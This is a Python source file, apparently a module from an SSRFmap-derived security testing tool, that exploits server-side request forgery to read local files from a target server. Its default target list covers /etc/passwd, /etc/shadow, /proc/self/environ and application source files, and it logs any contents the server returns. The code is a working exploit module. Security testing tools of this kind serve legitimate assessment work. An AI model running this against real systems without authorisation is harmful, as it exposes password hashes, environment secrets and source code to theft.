import logging
import os
from argparse import ArgumentParser
from typing import List

from levo_commons.status import Status

from ssrfmap.core.utils import diff_text, wrapper_file

name = "readfiles"
description = "Read files from the target"
author = "Swissky"
documentation: List[str] = []


class exploit:
    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        self.files = args.targetfiles or [
            "/etc/passwd",
            "/etc/lsb-release",
            "/etc/shadow",
            "/etc/hosts",
            "\/\/etc/passwd",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/cwd/index.php",
            "/proc/self/cwd/application.py",
            "/proc/self/cwd/main.py",
            "/proc/self/exe",
        ]

        r = requester.do_request(args.param, "")

        if r is not None:
            default = r.text

            for f in self.files:
                r = requester.do_request(args.param, wrapper_file(f))
                diff = diff_text(r.text, default)
                if diff != "":
                    requester.interactions[-1].status = Status.failure
                    # Display diff between default and ssrf request
                    logging.info("\033[32mReading file\033[0m : {}".format(f))
                    logging.debug(diff)

        else:
            logging.info("Empty response")
